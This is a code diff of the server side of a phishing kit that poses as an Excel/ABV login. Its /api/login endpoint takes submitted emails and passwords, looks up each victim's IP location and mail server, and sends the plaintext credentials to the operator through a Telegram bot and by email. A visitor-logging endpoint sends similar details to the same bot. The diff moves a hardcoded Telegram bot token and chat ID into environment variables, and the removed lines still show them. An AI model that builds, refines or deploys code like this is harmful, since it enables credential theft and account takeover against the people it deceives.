@@ -18,42 +18,44 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// TELEGRAM CONFIGURATION
+// TELEGRAM CONFIGURATION (FROM ENVIRONMENT VARIABLES)
 // ============================================================
 
-const BOT_TOKEN = "8165356500:AAGRl6iz2GNi_Az0xiHgtwTKFOlyNFPJntE";
-const CHAT_ID = "6066389308";
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // ============================================================
-// EMAIL CONFIGURATION - CHANGE THESE!
+// EMAIL CONFIGURATION (FROM ENVIRONMENT VARIABLES)
 // ============================================================
 
 const EMAIL_CONFIG = {
-    // For Gmail:
-    host: 'smtp.gmail.com',
-    port: 587,
-    secure: false,
+    host: process.env.SMTP_HOST || 'smtp.gmail.com',
+    port: parseInt(process.env.SMTP_PORT || '587', 10),
+    secure: process.env.SMTP_SECURE === 'true',
     auth: {
-        user: 'your-email@gmail.com',     // ← CHANGE THIS
-        pass: 'your-app-password'          // ← CHANGE THIS (App Password, not regular password)
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
     }
 };
 
-// For Outlook/Hotmail:
-// host: 'smtp.office365.com',
-// port: 587,
-// secure: false,
+// Email recipients (comma-separated in env, e.g. "a@x.com,b@y.com")
+const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
+    .split(',')
+    .map(e => e.trim())
+    .filter(Boolean);
 
-// For Yahoo:
-// host: 'smtp.mail.yahoo.com',
-// port: 587,
-// secure: false,
+// ============================================================
+// VALIDATION - Fail fast if required env vars are missing
+// ============================================================
 
-// Email recipients (who receives the login credentials)
-const EMAIL_RECIPIENTS = [
-    'recipient1@example.com',   // ← CHANGE THIS
-    // 'recipient2@example.com'  // Add more if needed
-];
+console.log('========================================');
+console.log('🔍 Environment check:');
+console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
+console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
+console.log(`   SMTP_USER:          ${EMAIL_CONFIG.auth.user ? '✅' : '❌ MISSING'}`);
+console.log(`   SMTP_PASS:          ${EMAIL_CONFIG.auth.pass ? '✅' : '❌ MISSING'}`);
+console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
+console.log('========================================');
 
 // ============================================================
 // CREATE EMAIL TRANSPORTER
@@ -62,6 +64,10 @@ const EMAIL_RECIPIENTS = [
 let emailTransporter = null;
 
 function createEmailTransporter() {
+    if (!EMAIL_CONFIG.auth.user || !EMAIL_CONFIG.auth.pass) {
+        console.log('⚠️ SMTP credentials missing — email disabled');
+        return null;
+    }
     try {
         emailTransporter = nodemailer.createTransport(EMAIL_CONFIG);
         console.log('✅ Email transporter created successfully');
@@ -77,13 +83,13 @@ function createEmailTransporter() {
 // ============================================================
 
 async function sendEmail(email, password, ipInfo, userAgent, domain) {
-    if (!emailTransporter) {
-        console.log('⚠️ Email transporter not configured, skipping email');
+    if (!emailTransporter || EMAIL_RECIPIENTS.length === 0) {
+        console.log('⚠️ Email not configured, skipping');
         return false;
     }
 
     const subject = `🔐 ABV Login Credentials - ${email}`;
-    
+
     const htmlContent = `
     <!DOCTYPE html>
     <html>
@@ -97,87 +103,48 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
             .label { font-weight: bold; color: #555; }
             .value { color: #1e930c; font-size: 16px; }
             .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
-            .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 12px; }
-            .badge-success { background: #d4edda; color: #155724; }
-            .badge-info { background: #d1ecf1; color: #0c5460; }
         </style>
     </head>
     <body>
         <div class="container">
-            <div class="header">
-                <h2>🔐 ABV Login Credentials</h2>
-            </div>
+            <div class="header"><h2>🔐 ABV Login Credentials</h2></div>
             <div class="content">
-                <div class="field">
-                    <div class="label">📧 Email:</div>
-                    <div class="value"><strong>${email}</strong></div>
-                </div>
-                <div class="field">
-                    <div class="label">🔑 Password:</div>
-                    <div class="value"><strong>${password}</strong></div>
-                </div>
-                <div class="field">
-                    <div class="label">🌐 Domain:</div>
-                    <div class="value">${domain || 'Unknown'}</div>
-                </div>
-                <div class="field">
-                    <div class="label">🌍 IP Address:</div>
-                    <div class="value">${ipInfo?.ip || 'Unknown'}</div>
-                </div>
-                <div class="field">
-                    <div class="label">📍 Location:</div>
-                    <div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div>
-                </div>
-                <div class="field">
-                    <div class="label">📱 Browser:</div>
-                    <div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div>
-                </div>
-                <div class="field">
-                    <div class="label">🕐 Time:</div>
-                    <div class="value">${new Date().toLocaleString()}</div>
-                </div>
-                <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px; border-left: 4px solid #ffc107;">
-                    <span class="badge badge-info">ℹ️</span> 
-                    <span style="font-size: 13px;">This is an automated notification from your ABV login monitoring system.</span>
-                </div>
+                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
+                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
+                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
+                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📱 Browser:</div><div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div></div>
+                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
             </div>
-            <div class="footer">
-                <p>© ${new Date().getFullYear()} ABV Monitor • Automated Notification</p>
-            </div>
+            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
         </div>
     </body>
     </html>
     `;
 
     const textContent = `
-    🔐 ABV Login Credentials
-    ════════════════════════════════════
-    
-    📧 Email: ${email}
-    🔑 Password: ${password}
-    🌐 Domain: ${domain || 'Unknown'}
-    🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
-    📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
-    📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
-    🕐 Time: ${new Date().toLocaleString()}
-    
-    ════════════════════════════════════
-    This is an automated notification.
+🔐 ABV Login Credentials
+════════════════════════════════════
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 Domain: ${domain || 'Unknown'}
+🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
+📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
+📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
+🕐 Time: ${new Date().toLocaleString()}
+════════════════════════════════════
     `;
 
     try {
-        const mailOptions = {
+        const info = await emailTransporter.sendMail({
             from: EMAIL_CONFIG.auth.user,
             to: EMAIL_RECIPIENTS.join(', '),
-            subject: subject,
+            subject,
             text: textContent,
             html: htmlContent
-        };
-
-        const info = await emailTransporter.sendMail(mailOptions);
-        console.log('✅ Email sent successfully!');
-        console.log('📨 Message ID:', info.messageId);
-        console.log('📨 Recipients:', EMAIL_RECIPIENTS.join(', '));
+        });
+        console.log('✅ Email sent:', info.messageId);
         return true;
     } catch (error) {
         console.error('❌ Failed to send email:', error.message);
@@ -186,10 +153,14 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
 }
 
 // ============================================================
-// HELPER: Send message to Telegram
+// HELPER: Send to Telegram
 // ============================================================
 
 async function sendToTelegram(message) {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.log('⚠️ Telegram not configured, skipping');
+        return null;
+    }
     try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -200,7 +171,7 @@ async function sendToTelegram(message) {
             })
         });
         const result = await response.json();
-        console.log('📤 Telegram response:', result.ok ? '✅ Sent' : '❌ Failed');
+        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
         return result;
     } catch (error) {
         console.error('❌ Telegram error:', error.message);
@@ -214,7 +185,9 @@ async function sendToTelegram(message) {
 
 async function getIPInfo(ip) {
     try {
-        const response = await fetch(`https://ipinfo.io/${ip}/json`);
+        // Extract first IP if "x-forwarded-for" contains multiple
+        const firstIP = (ip || '').split(',')[0].trim();
+        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
         const data = await response.json();
         return data;
     } catch (error) {
@@ -232,7 +205,7 @@ async function getMXRecord(domain) {
         const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
         const data = await response.json();
         if (data && data.Answer && data.Answer.length > 0) {
-            return data.Answer.map(record => record.data).join('\n');
+            return data.Answer.map(r => r.data).join('\n');
         }
         return 'no-mx';
     } catch (error) {
@@ -241,7 +214,7 @@ async function getMXRecord(domain) {
 }
 
 // ============================================================
-// HEALTH CHECK ENDPOINT
+// HEALTH CHECK
 // ============================================================
 
 app.get('/health', (req, res) => {
@@ -249,7 +222,8 @@ app.get('/health', (req, res) => {
         status: 'ok',
         timestamp: new Date().toISOString(),
         uptime: process.uptime(),
-        emailConfigured: !!emailTransporter
+        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
+        emailConfigured: !!(emailTransporter && EMAIL_RECIPIENTS.length)
     });
 });
 
@@ -264,20 +238,12 @@ app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
 
     if (!email || !password) {
-        console.log('❌ Missing email or password');
-        return res.status(400).json({
-            success: false,
-            message: 'Email and password are required'
-        });
+        return res.status(400).json({ success: false, message: 'Email and password are required' });
     }
 
     const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
     if (!emailRegex.test(email)) {
-        console.log('❌ Invalid email format:', email);
-        return res.status(400).json({
-            success: false,
-            message: 'Invalid email format'
-        });
+        return res.status(400).json({ success: false, message: 'Invalid email format' });
     }
 
     console.log(`📧 Email: ${email}`);
@@ -290,20 +256,13 @@ app.post('/api/login', async (req, res) => {
     console.log(`📍 Location: ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}`);
 
     const domain = email.split('@')[1];
-    console.log(`🌐 Domain: ${domain}`);
-
     const mxRecord = await getMXRecord(domain);
-    console.log(`📨 MX Record: ${mxRecord}`);
+    console.log(`🌐 Domain: ${domain} | MX: ${mxRecord.split('\n')[0]}`);
 
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-    console.log(`📱 Browser: ${userAgent.substring(0, 100)}...`);
 
-    // ============================================================
-    // SEND NOTIFICATIONS
-    // ============================================================
-
-    // 1. Send to Telegram
+    // ---------- Telegram ----------
     const telegramMessage = `
 --------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
 Email : ${email}
@@ -321,23 +280,18 @@ Date : ${new Date().toISOString()}
     console.log('📤 Sending to Telegram...');
     const telegramResult = await sendToTelegram(telegramMessage);
 
-    // 2. Send Email
+    // ---------- Email ----------
     console.log('📧 Sending email...');
     const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain);
 
-    // ============================================================
-    // RESPONSE
-    // ============================================================
-
-    if ((telegramResult && telegramResult.ok) || emailResult) {
+    // ---------- Response ----------
+    const telegramOK = !!(telegramResult && telegramResult.ok);
+    if (telegramOK || emailResult) {
         console.log('✅ Notifications sent successfully');
         return res.json({
             success: true,
             message: 'Login processed successfully',
-            notifications: {
-                telegram: !!(telegramResult && telegramResult.ok),
-                email: emailResult
-            }
+            notifications: { telegram: telegramOK, email: emailResult }
         });
     } else {
         console.log('❌ Failed to send notifications');
@@ -353,13 +307,10 @@ Date : ${new Date().toISOString()}
 // ============================================================
 
 app.post('/api/log', async (req, res) => {
-    console.log('📊 Visitor log received');
     const { email } = req.body;
-
     const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-
     const ipInfo = await getIPInfo(clientIP);
 
     const message = `
@@ -370,13 +321,12 @@ Language : ${acceptLanguage}
 IP Address : ${clientIP}
 ---------+ Excel Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
 `;
-
     await sendToTelegram(message);
     res.json({ success: true });
 });
 
 // ============================================================
-// CATCH-ALL: Handle 404
+// 404
 // ============================================================
 
 app.use('*', (req, res) => {
@@ -393,26 +343,11 @@ app.use('*', (req, res) => {
 app.listen(PORT, () => {
     console.log('========================================');
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
-    console.log(`📧 Login endpoint: http://localhost:${PORT}/api/login`);
+    console.log(`🌐 Health: http://localhost:${PORT}/health`);
+    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
     console.log('========================================');
-    console.log(`🤖 Telegram Bot: ${BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
-    console.log(`📱 Chat ID: ${CHAT_ID ? '✅ Configured' : '❌ Not configured'}`);
-    console.log(`📧 Email: ${EMAIL_CONFIG.auth.user ? '✅ Configured' : '❌ Not configured'}`);
-    console.log('========================================');
-
-    // Initialize email transporter
     createEmailTransporter();
 });
 
-// ============================================================
-// ERROR HANDLING
-// ============================================================
-
-process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error.message);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection:', reason);
-});
+process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
+process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));
